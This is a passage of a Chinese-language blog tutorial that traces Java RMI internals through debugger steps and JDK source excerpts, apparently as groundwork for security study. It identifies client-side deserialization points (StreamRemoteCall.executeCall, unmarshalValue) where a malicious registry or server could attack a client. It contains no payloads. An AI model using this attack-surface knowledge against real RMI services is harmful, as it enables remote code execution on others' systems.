<span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        r.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, remoteObj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>RMI 客户端通过远程调用服务端的 sayHello 方法，成功在服务端输出了大写的“HELLO”。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053449.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="3、流程原理"><a href="#3、流程原理" class="headerlink" title="3、流程原理"></a>3、流程原理</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054922.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="3-1-服务端-创建远程服务"><a href="#3-1-服务端-创建远程服务" class="headerlink" title="3.1 服务端-创建远程服务"></a>3.1 服务端-创建远程服务</h3><p>调试分析远程对象的创建过程：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054982.png" srcset="/img/loading.gif" lazyload></p>
+<p>进入其构造函数，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054278.png" srcset="/img/loading.gif" lazyload></p>
+<p>**UnicastRemoteObject **中 ，port 被默认赋值为 0</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054504.png" srcset="/img/loading.gif" lazyload></p>
+<p>步入  UnicastRemoteObject  类中的 <strong>exportObject</strong> （姑且称为导出对象函数）</p>
+<ul>
+<li><font style="color:#080808;background-color:#ffffff;">public static</font>：不需要创建 UnicastRemoteObject  实例也可以调用<ul>
+<li><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250804062.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+<li>Remote obj：实现了 java.rmi.Remote 接口的对象，</li>
+<li>int port： 接收客户端的请求</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054938.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054839.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下进入 return exportObject(obj, new UnicastServerRef(port)); 中的  <font style="color:#080808;background-color:#ffffff;">new UnicastServerRef(port))，</font><strong><font style="color:#080808;background-color:#ffffff;">UnicastServerRef</font></strong><font style="color:#080808;background-color:#ffffff;">（称之为服务端引用）</font></p>
+<p><font style="color:#080808;background-color:#ffffff;">var 1 这里是端口号 port ，传入 port 后，调用 父类构造函数 </font><strong><font style="color:#080808;background-color:#ffffff;">LiveRef</font></strong><font style="color:#080808;background-color:#ffffff;">,</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054384.png" srcset="/img/loading.gif" lazyload></p>
+<p>来到 LiveRef 的构造函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054590.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里可以看一下 getLocalEndpoint</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054700.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里的 <strong>TCPEndpoint</strong> 用于远程通信，其构造函数中的变量 String var1 为 host (ip) 、int var2 为 port (端口)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054805.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055474.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055635.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055596.png" srcset="/img/loading.gif" lazyload></p>
+<p>继续跟入 <font style="color:#080808;background-color:#ffffff;">this(var1, TCPEndpoint.getLocalEndpoint(var2), true); 中的 </font>this，在此处 ep 中有了IP和端口信息</p>
+<ul>
+<li>Endpoint ep    端点信息（IP、端口、socket）</li>
+<li>Channel ch     通信通道（缓存的连接）</li>
+<li>isLoacl    是否为本地对象</li>
+</ul>
+<p>然后这些信息都被存放在 LiveRef 中。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055311.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055578.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来又调用了父类方法并将 ref 赋值为 var1（var1:<strong>LiveRef@626</strong>）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055804.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来回到  <font style="color:#080808;background-color:#ffffff;">return exportObject(obj, new UnicastServerRef(port)); 中的  exportObject 方法</font></p>
+<p><font style="color:#080808;background-color:#ffffff;">首先判断了 obj 是否继承了 UnicastRemoteObject ，如果没有继承那么就把 ref 设置为 sref。</font></p>
+<p><font style="color:#080808;background-color:#ffffff;">之后都使用 sref.exportObject 进行工作完成导出远程对象的操作</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056355.png" srcset="/img/loading.gif" lazyload></p>
+<p>而 sref 中封装着 LiveRef@626</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056610.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:#080808;background-color:#ffffff;"></font></p>
+<p><strong><font style="color:#080808;background-color:#ffffff;">sref.exportObject </font></strong> 的执行过程：</p>
+<p><code>stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</code>这一步是创建<strong>客户端代理</strong>的过程。</p>
+<blockquote>
+<p>（为什么要在服务端创建客户端代理呢？）</p>
+<p>这里通过流程图解释：服务端首先创建好 Remote Stub 放到注册中心，客户端通过注册中心拿到 Remote Stub，客户端通过 Remote Stub 调用另一个代理 Remote Skeleton ，之后 Remote Skeleton 调用服务端。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056850.png" srcset="/img/loading.gif" lazyload></p>
+</blockquote>
+<p>步入 createProxy</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056981.png" srcset="/img/loading.gif" lazyload></p>
+<p>clientRef 中存放的就是那个核心 LiveRef@783 （上文是 LiveRef@626，核心都是相同的）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056845.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056633.png" srcset="/img/loading.gif" lazyload></p>
+<p>此处进行了判断：</p>
+<ul>
+<li>forceStubUse：如果为 <code>true</code>，就强制使用旧的 <strong>静态 Stub 类</strong>（由 <code>rmic</code> 工具生成的 <code>_Stub.class</code>）这是为了兼容 JDK 1.1 时代的 RMI，这种情况直接调用 <code>createStub(...)</code> 去加载和实例化 Stub</li>
+<li>ignoreStubClasses：如果为 <code>true</code>，表示忽略静态 Stub 类。这时会尝试用 <strong>动态代理</strong>（<code>java.lang.reflect.Proxy</code>）来生成 Stub</li>
+<li>stubClassExists：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">stubClassExists</span><span class="hljs-params">(Class&lt;?&gt; remoteClass)</span> &#123;<br>    <span class="hljs-comment">//先看缓存：withoutStubs 用来存放 “已经确定没有 Stub 的类”</span><br>    <span class="hljs-keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//尝试用 Class.forName 加载 [远程类名 + &quot;_Stub&quot;] 这个类</span><br>            Class.forName(remoteClass.getName() + <span class="hljs-string">&quot;_Stub&quot;</span>,<br>                          <span class="hljs-literal">false</span>,<br>                          remoteClass.getClassLoader());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">//如果能加载成功，说明确实存在 Stub 类</span><br><br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>            <span class="hljs-comment">// 如果加载不到，说明这个远程类没有对应的 &quot;_Stub&quot;</span><br>            <span class="hljs-comment">//  那么就把它记到 withoutStubs 缓存里，下次查询就直接返回 false</span><br>            withoutStubs.put(remoteClass, <span class="hljs-literal">null</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//如果缓存里已有，或者加载失败，就返回 false</span><br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>如果要进入 createStub ，<strong>强制使用 Stub</strong><code>forceStubUse == true</code>，<strong>没有忽略 Stub 并且存在 Stub 类</strong><code>ignoreStubClasses == false``stubClassExists(remoteClass) == true</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056496.png" srcset="/img/loading.gif" lazyload></p>
+<p>下一步创建动态代理</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056087.png" srcset="/img/loading.gif" lazyload></p>
+<p>其中的 handler 存放 LiveRef@783</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056321.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样就创建好了动态代理 <strong>stub</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057316.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057112.png" srcset="/img/loading.gif" lazyload></p>
+<p>进入 Target （实际上是将目前创建的东西都封装到一起）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057390.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>客户端引用（stub）和服务端引用（disp）的 LiveRef 是一样的，</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057434.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057072.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057553.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来，将封装好的 target 发布出去</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057747.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057010.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058476.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟到了 TCPTransport 类中的 exportObject</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058357.png" srcset="/img/loading.gif" lazyload></p>
+<p>listen() 函数先获取 <strong>TCPEndpoint@823</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805468.png" srcset="/img/loading.gif" lazyload></p>
+<p>准备创建 ServerSocket</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058662.png" srcset="/img/loading.gif" lazyload></p>
+<p>判断 port 是否为 0，如果为 0 ，进入 setDefaultPort，设置端口号</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (listenPort == <span class="hljs-number">0</span>)<br>    setDefaultPort(server.getLocalPort(), csf, ssf);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058959.png" srcset="/img/loading.gif" lazyload></p>
+<p>进入 server.getLocalPort </p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058480.png" srcset="/img/loading.gif" lazyload></p>
+<p>在这个函数中端口被赋值，此端口随机，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058618.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个时候的端口被赋值为 55685</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805487.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058891.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>doPrivileged： 表示即使调用栈上其他代码没有权限，也允许这里的操作按本方法的权限执行。 </li>
+<li>NewThreadAction： 创建一个新的线程</li>
+</ul>
+<p>这个线程开启之后等待客户端的连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058990.png" srcset="/img/loading.gif" lazyload></p>
+<p>做完这些之后，用 MAP 表储存 target，target 中包括了 IP、端口、服务端代理、客户端代理等信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058314.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后返回一些值，完成了服务端的发布过程。</p>
+<p>到这里在返回看 <strong>exportObject 函数的作用</strong>：</p>
+<ul>
+<li>静态方法的 <font style="color:#080808;background-color:#ffffff;">exportObject 传入俩个参数，创建一个 UnicastServerRef 对象 sref ，sref 中封装了IP、端口等信息，核心是 LiveRef@xxx，然后调用 exportObject(obj, sref)</font></li>
+<li><font style="color:#080808;background-color:#ffffff;">重载方法的 exportObject 返回代理对象 stub</font></li>
+<li>这样就做到了把一个本地的远程对象实例导出成一个可以远程访问的对象</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058084.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="3-2-注册中心-创建注册中心-绑定"><a href="#3-2-注册中心-创建注册中心-绑定" class="headerlink" title="3.2 注册中心-创建注册中心+绑定"></a>3.2 注册中心-创建注册中心+绑定</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058089.png" srcset="/img/loading.gif" lazyload></p>
+<p>调用 createRegistry  创建注册中心，默认端口号为1099</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058574.png" srcset="/img/loading.gif" lazyload></p>
+<p>到了这一步点“恢复程序”，如果继续跟进去会发现一堆奇怪的东西</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059987.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806502.png" srcset="/img/loading.gif" lazyload></p>
+<p>来到这一步：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059539.png" srcset="/img/loading.gif" lazyload></p>
+<p>创建了一个 LiveRef，一个 lref，（这里的作用和服务端的实际上是一样的）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059580.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059524.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="3-3-客户端-请求注册中心"><a href="#3-3-客户端-请求注册中心" class="headerlink" title="3.3 客户端-请求注册中心"></a>3.3 客户端-请求注册中心</h3><p>首先连接注册中心，接收传入的IP和端口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059631.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059585.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用LIveRef ，将传入的 host,port,等封装</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059455.png" srcset="/img/loading.gif" lazyload></p>
+<p>再次调用 <font style="color:#080808;background-color:#ffffff;">createProxy 方法，同样的创建了 stub ，（这里的创建是通过注册中心传入参数（host,port..），客户端自行创建 stub）</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059526.png" srcset="/img/loading.gif" lazyload></p>
+<p>来到下一步：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806495.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059518.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059247.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="问题：在动态调试时遇到报错，可能是服务端没有开启！"><a href="#问题：在动态调试时遇到报错，可能是服务端没有开启！" class="headerlink" title="问题：在动态调试时遇到报错，可能是服务端没有开启！"></a>问题：在动态调试时遇到报错，可能是服务端没有开启！</h4><p>下一步调用会报以下错误，因为服务端没有开启监听</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100821.png" srcset="/img/loading.gif" lazyload></p>
+<p>将 RMIServer 运行起来就可以了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059422.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里看到传进来的 var1 实际上就是<code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code>中的 <code>remoteObj</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100050.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Remote <span class="hljs-title function_">lookup</span><span class="hljs-params">(String var1)</span> <span class="hljs-keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//创建远程调用对象</span><br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//序列化参数，将 var1 写入输出流</span><br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>            var3.writeObject(var1);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var18) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var18);<br>        &#125;<br><br>        <span class="hljs-comment">//发起远程调用，</span><br>        <span class="hljs-built_in">super</span>.ref.invoke(var2);<br><br>        Remote var23;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">///从输入流中读取远程 registry 返回的对象</span><br>            <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>            <span class="hljs-comment">//</span><br>            var23 = (Remote)var6.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var15);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var16) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var16);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-built_in">super</span>.ref.done(var2);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> var23;<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var19) &#123;<br>        <span class="hljs-keyword">throw</span> var19;<br>    &#125; <span class="hljs-keyword">catch</span> (RemoteException var20) &#123;<br>        <span class="hljs-keyword">throw</span> var20;<br>    &#125; <span class="hljs-keyword">catch</span> (NotBoundException var21) &#123;<br>        <span class="hljs-keyword">throw</span> var21;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var22) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var22);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>跟进 <strong>invoke</strong></p>
+<p><strong>super.ref.invoke(var2);</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100488.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100413.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100826.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100956.png" srcset="/img/loading.gif" lazyload></p>
+<p>StreamRemoteCall 类中的 executeCall 是真正处理网络请求的方法</p>
+<p><strong>executeCall 中有一步通过反序列化处理异常，如果注册中心有恶意对象，客户端在此处反序列化时被攻击。</strong></p>
+<p><strong>由于 executeCall 是客户端网络请求的必经之路，所以这个反序列化几乎不可避免</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100633.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里的 lookup 方法的作用就是去注册中心查找远程对象</p>
+<h3 id="3-4-客户端-请求服务端"><a href="#3-4-客户端-请求服务端" class="headerlink" title="3.4 客户端-请求服务端"></a>3.4 客户端-请求服务端</h3><p><strong>同样注意开启服务端</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100785.png" srcset="/img/loading.gif" lazyload></p>
+<p>来到了 invoke</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100700.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100902.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里又跟到了 StreamRemoteCall ，这样的请求同样可以被攻击</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100629.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101578.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100270.png" srcset="/img/loading.gif" lazyload></p>
+<p>结束 <font style="color:#080808;background-color:#ffffff;">call.executeCall(); 后会出现另一个反序列化点</font></p>
+<p>进入 <strong>unmarshalValue</strong> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101064.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>unmarshalValue 函数的作用就是根据目标类型，选择正确的方式从输入流中读取数据</strong>。</p>
+<ul>
+<li>对基本类型，用专门的 <code>readxxx()</code> 方法读取，再返回</li>
+<li>对对象类型，直接调用 <code>readObject()</code> 反序列化</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250807873.png" srcset="/img/loading.gif" lazyload></p>
+<p>returnValue 返回了 “HELLO”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101630.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="总结-客户端产生的反序列化漏洞点"><a href="#总结-客户端产生的反序列化漏洞点" class="headerlink" title="总结-客户端产生的反序列化漏洞点"></a>总结-客户端产生的反序列化漏洞点</h4><ol>
+<li>StreamRemoteCall.executeCall</li>
+</ol>
+<p>StreamRemoteCall 类中的 executeCall 是真正处理网络请求的方法</p>
+<p><strong>executeCall 中有一步通过反序列化处理异常，如果注册中心有恶意对象，客户端在此处反序列化时被攻击。</strong></p>
+<p><strong>由于 executeCall 是客户端网络请求的必经之路，所以这个反序列化几乎不可避免</strong></p>
+<hr>
+<p>executeCall 处理的协议就是<strong>JRMP 协议</strong></p>
+<ol start="2">
+<li>unmarshalValue</li>
+</ol>
+<p>unmarshalValue 函数向服务端请求获取返回值时，返回值是通过反序列化产生的。</p>
+<h3 id="3-5-注册中心-客户端请求时"><a href="#3-5-注册中心-客户端请求时" class="headerlink" title="3.5 注册中心-客户端请求时"></a>3.5 注册中心-客户端请求时</h3><p>前面说过，服务端创建了 stub 并将信息封装到 target，随后的 NewThreadAction 创建了一个新的线程，等待客户端的响应</p>
+<blockquote>
+<p>这个线程开启之后等待客户端的连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101934.png" srcset="/img/loading.gif" lazyload></p>
+</blockquote>
+<p>现在进入创建线程的流程：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101994.png" srcset="/img/loading.gif" lazyload></p>
+<p>进入 run() 后，只能调用 <font style="color:#080808;background-color:#ffffff;">executeAcceptLoop，executeAcceptLoop 又创建了一个新的线程</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101732.png" srcset="/img/loading.gif" lazyload></p>
+<p>run 调用了 run0</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101959.png" srcset="/img/loading.gif" lazyload></p>
+<p>run0 前面都是在解析一些协议，重点是 <strong>handleMessages</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101134.png" srcset="/img/loading.gif" lazyload></p>
+<p>其中的 默认情况是调用了 serviceCall</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102514.png" srcset="/img/loading.gif" lazyload></p>
+<p>serviceCall 会从表中获取 target</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102601.png" srcset="/img/loading.gif" lazyload></p>
+<p>此处断点调试：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102239.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到断点处的 stub 就是服务端创建好的东西</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102908.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102432.png" srcset="/img/loading.gif" lazyload></p>
